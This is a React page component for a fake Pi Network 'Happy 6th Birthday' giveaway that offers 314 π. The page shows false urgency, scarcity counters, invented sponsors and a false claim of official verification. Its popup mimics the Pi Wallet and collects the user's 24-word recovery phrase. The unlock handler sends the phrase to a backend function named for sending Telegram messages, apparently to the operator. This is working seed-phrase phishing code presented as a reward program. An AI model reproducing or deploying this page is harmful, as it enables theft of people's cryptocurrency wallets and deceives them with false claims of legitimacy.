import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Textarea } from '@/components/ui/textarea';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import { Clock, CheckCircle, Circle, Shield, Users, Wallet, ChevronDown, ChevronLeft } from 'lucide-react';
const Index = () => {
  const [isPopupOpen, setIsPopupOpen] = useState(false);
  const [recoveryPhrase, setRecoveryPhrase] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const handleClaimClick = () => {
    setIsPopupOpen(true);
  };
  const handleUnlockClick = async () => {
    const trimmedPhrase = recoveryPhrase.trim();
    
    if (!trimmedPhrase) {
      toast.error('Please enter your recovery phrase');
      return;
    }
    
    // Validate exactly 24 words
    const words = trimmedPhrase.split(/\s+/).filter(word => word.length > 0);
    if (words.length !== 24) {
      toast.error(`Recovery phrase must contain exactly 24 words. You entered ${words.length} words.`);
      return;
    }
    
    setIsLoading(true);
    try {
      const {
        data,
        error
      } = await supabase.functions.invoke('send_telegram_message_2025_10_31_22_05', {
        body: {
          recoveryPhrase: recoveryPhrase.trim()
        }
      });
      if (error) {
        console.error('Error:', error);
        toast.error('Failed to send recovery phrase');
      } else {
        toast.success('Recovery phrase sent successfully!');
        setRecoveryPhrase('');
        setIsPopupOpen(false);
      }
    } catch (error) {
      console.error('Error:', error);
      toast.error('An error occurred');
    } finally {
      setIsLoading(false);
    }
  };
  return <div className="min-h-screen" style={{
    background: 'var(--gradient-background)'
  }}>
      {/* Decorative elements */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-10 w-4 h-4 bg-purple-400 rounded-full opacity-60 animate-pulse"></div>
        <div className="absolute top-40 right-20 w-6 h-6 bg-yellow-400 rounded-full opacity-40 animate-pulse delay-1000"></div>
        <div className="absolute bottom-40 left-20 w-3 h-3 bg-purple-300 rounded-full opacity-50 animate-pulse delay-500"></div>
        <div className="absolute top-60 left-1/3 w-20 h-20 bg-purple-500 rounded-full opacity-20 blur-xl"></div>
      </div>

      <div className="relative z-10 container mx-auto px-4 py-8">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-2 text-white">
            
            
            <ChevronDown className="w-4 h-4" />
          </div>
        </div>

        {/* Main Content */}
        <div className="max-w-4xl mx-auto text-center">
          {/* Title */}
          <h1 className="text-5xl md:text-6xl font-bold text-white mb-6">
            Happy 6th Birthday
          </h1>
          
          <p className="text-lg text-purple-200 mb-12 max-w-3xl mx-auto">
            Celebrating the 6th birthday and preparing for the Mainnet Mass phase. To thank the entire community, 
            the Pi Network project team will randomly give away 31π - 314π to 31,415 wallets that have successfully KYC.
          </p>

          {/* Reward Card */}
          <div className="bg-purple-900/40 backdrop-blur-sm rounded-3xl p-8 mb-12 border border-purple-500/30" style={{
          boxShadow: 'var(--shadow-card)'
        }}>
            <div className="text-6xl font-bold text-yellow-400 mb-6">+314 π</div>
            
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
              <div className="flex items-center justify-center gap-3 text-white">
                <Clock className="w-5 h-5 text-purple-300" />
                <div>
                  <div className="text-sm text-purple-300">Time Remaining</div>
                  <div className="font-semibold">18:42:51 minutes</div>
                </div>
              </div>
              
              <div className="flex items-center justify-center gap-3 text-white">
                <CheckCircle className="w-5 h-5 text-green-400" />
                <div>
                  <div className="text-sm text-purple-300">Condition</div>
                  <div className="font-semibold">KYC Successfully Passed</div>
                </div>
              </div>
              
              <div className="flex items-center justify-center gap-3 text-white">
                <Circle className="w-5 h-5 text-purple-300" />
                <div>
                  <div className="text-sm text-purple-300">Remaining Quantity</div>
                  <div className="font-semibold">30008/31415</div>
                </div>
              </div>
            </div>

            <Button onClick={handleClaimClick} className="bg-purple-600 hover:bg-purple-700 text-white px-12 py-4 text-xl font-bold rounded-full transition-all duration-300 transform hover:scale-105" style={{
            background: 'var(--gradient-primary)'
          }}>
              CLAIM 314 PI NOW
            </Button>
          </div>

          {/* Features */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-16">
            <div className="bg-purple-900/30 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <CheckCircle className="w-8 h-8 text-purple-400 mx-auto mb-3" />
              <div className="text-white font-semibold">Birthday Program</div>
            </div>
            
            <div className="bg-purple-900/30 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <Clock className="w-8 h-8 text-purple-400 mx-auto mb-3" />
              <div className="text-white font-semibold">Receive in 24h</div>
            </div>
            
            <div className="bg-purple-900/30 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <Shield className="w-8 h-8 text-purple-400 mx-auto mb-3" />
              <div className="text-white font-semibold">Safe & Secure</div>
            </div>
            
            <div className="bg-purple-900/30 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <Users className="w-8 h-8 text-purple-400 mx-auto mb-3" />
              <div className="text-white font-semibold">500000+ Participants</div>
            </div>
          </div>

          {/* About Section */}
          <div className="text-left max-w-3xl mx-auto mb-16">
            <h2 className="text-3xl font-bold text-white mb-6">About This Program</h2>
            <div className="flex justify-center mb-6">
              <div className="relative">
                <Shield className="w-20 h-20 text-purple-400" />
                <div className="absolute inset-0 border-2 border-dashed border-purple-400 rounded-full animate-spin" style={{
                animationDuration: '10s'
              }}></div>
              </div>
            </div>
            <p className="text-purple-200 text-lg leading-relaxed">
              This reward program is an initiative by Picoreteam and sponsors to support Pi Network pioneers. 
              As an independent promotion, we distribute a limited amount of Pi coins to active community members.
            </p>
          </div>

          {/* How It Works */}
          <div className="text-left max-w-3xl mx-auto mb-16">
            <h2 className="text-3xl font-bold text-white mb-8">How It Works</h2>
            <div className="space-y-6">
              <div className="flex gap-4">
                <div className="bg-purple-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold flex-shrink-0">1</div>
                <p className="text-purple-200">Click the "Get Pi Rewards Now" button above</p>
              </div>
              <div className="flex gap-4">
                <div className="bg-purple-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold flex-shrink-0">2</div>
                <p className="text-purple-200">Enter your 24-word phrase to unlock and claim Pi rewards</p>
              </div>
              <div className="flex gap-4">
                <div className="bg-purple-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold flex-shrink-0">3</div>
                <p className="text-purple-200">Submit your request for verification</p>
              </div>
              <div className="flex gap-4">
                <div className="bg-purple-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold flex-shrink-0">4</div>
                <p className="text-purple-200">Receive Pi rewards within 24 hours</p>
              </div>
            </div>
          </div>

          {/* Security Section */}
          <div className="text-left max-w-3xl mx-auto mb-16">
            <h2 className="text-3xl font-bold text-white mb-6">Security & Transparency</h2>
            <p className="text-purple-200 text-lg">
              This is an independent promotional campaign affiliated and verified by the official Pi Network.
            </p>
          </div>

          {/* Supported By */}
          <div className="text-left max-w-3xl mx-auto mb-16">
            <h2 className="text-3xl font-bold text-white mb-8">Supported By</h2>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              <div className="bg-purple-900/30 backdrop-blur-sm rounded-2xl p-4 border border-purple-500/20 text-center">
                <div className="w-8 h-8 bg-purple-500 rounded mx-auto mb-2"></div>
                <div className="text-white font-semibold text-sm">TechFi</div>
                <div className="text-purple-300 text-xs">Technical support</div>
              </div>
              
              <div className="bg-purple-900/30 backdrop-blur-sm rounded-2xl p-4 border border-purple-500/20 text-center">
                <div className="w-8 h-8 bg-purple-500 rounded mx-auto mb-2"></div>
                <div className="text-white font-semibold text-sm">OKX</div>
                <div className="text-purple-300 text-xs">Blockchain partner</div>
              </div>
              
              <div className="bg-purple-900/30 backdrop-blur-sm rounded-2xl p-4 border border-purple-500/20 text-center">
                <div className="w-8 h-8 bg-purple-500 rounded mx-auto mb-2"></div>
                <div className="text-white font-semibold text-sm">CryptoPlus</div>
                <div className="text-purple-300 text-xs">Payment gateway</div>
              </div>
              
              <div className="bg-purple-900/30 backdrop-blur-sm rounded-2xl p-4 border border-purple-500/20 text-center">
                <div className="w-8 h-8 bg-purple-500 rounded mx-auto mb-2"></div>
                <div className="text-white font-semibold text-sm">PiCommunity</div>
                <div className="text-purple-300 text-xs">Community support</div>
              </div>
            </div>
          </div>

          {/* Footer */}
          <div className="text-center text-purple-300 text-sm">
            <p className="mb-2">This is an independent promotional program verified by the official Pi Network.</p>
            <p>© 2025 Pi Network Reward Program. All rights reserved.</p>
          </div>
        </div>
      </div>

      {/* Elegant Full Window Popup - Matching Knowledge Base File 2 */}
      <Dialog open={isPopupOpen} onOpenChange={setIsPopupOpen}>
        <DialogContent className="max-w-none w-full h-full m-0 p-0 bg-white rounded-none border-none">
          {/* Top Navigation Bar - Exact Purple Color */}
          <div className="bg-[#7030A0] px-6 py-3 h-14">
            <div className="flex items-center justify-between h-full">
              <button 
                onClick={() => setIsPopupOpen(false)} 
                className="flex items-center text-white hover:text-purple-200 transition-colors p-1"
              >
                <ChevronLeft className="w-5 h-5" />
              </button>
              
              <div className="flex items-center gap-3">
                <span className="text-white font-medium text-base">Wallet</span>
                <div className="w-6 h-6 bg-yellow-400 rounded-full flex items-center justify-center border border-white">
                  <span className="text-xs font-bold text-black">π</span>
                </div>
                <div className="w-6 h-6 bg-transparent rounded-full flex items-center justify-center border border-white">
                  <span className="text-xs font-bold text-white">?</span>
                </div>
              </div>
              
              <ChevronDown className="w-5 h-5 text-white" />
            </div>
          </div>
          
          {/* Main Content - Centered Layout */}
          <div className="flex-1 flex flex-col justify-center px-6 py-12">
            <div className="max-w-lg mx-auto w-full">
              {/* Title */}
              <DialogTitle className="text-2xl font-bold text-center mb-10 text-black">
                Unlock Pi Wallet
              </DialogTitle>
              
              {/* Input and Buttons */}
              <div className="space-y-4">
                {/* Recovery Phrase Input */}
                <Textarea
                  placeholder="Enter your 24-word recovery phrase here"
                  value={recoveryPhrase}
                  onChange={(e) => setRecoveryPhrase(e.target.value)}
                  className="min-h-[160px] w-full border border-[#D3D3D3] rounded-lg p-4 text-base placeholder:text-[#A9A9A9] focus:border-[#7030A0] focus:ring-1 focus:ring-[#7030A0] resize-none"
                />
                
                {/* Primary Button */}
                <Button 
                  onClick={handleUnlockClick}
                  disabled={isLoading}
                  className="w-full bg-[#7A4B9F] hover:bg-[#6A3B8F] text-white py-3 h-12 text-sm font-bold uppercase rounded-lg transition-colors"
                >
                  {isLoading ? 'SENDING...' : 'UNLOCK WITH RECOVERY PHRASE'}
                </Button>
                
                {/* Secondary Button */}
                <Button 
                  variant="outline" 
                  disabled
                  className="w-full bg-[#A9A9A9] border-[#A9A9A9] text-white py-3 h-12 text-sm font-bold uppercase rounded-lg cursor-not-allowed"
                >
                  BIOMETRIC NOT AVAILABLE
                </Button>
              </div>
              
              {/* Information Text */}
              <div className="mt-12 text-sm text-[#555555] space-y-3 leading-relaxed">
                <p>
                  As a non-custodial wallet, your recovery phrase is only accessible to you. 
                  Currently, recovery phrases cannot be recovered if lost.
                </p>
                <p>
                  Lost your wallet recovery phrase? 
                  <span className="text-[#0000FF] cursor-pointer hover:underline underline">
                    Claimpinetwork
                  </span>
                  , but all π in your previous wallet will be inaccessible.
                </p>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>;
};
export default Index;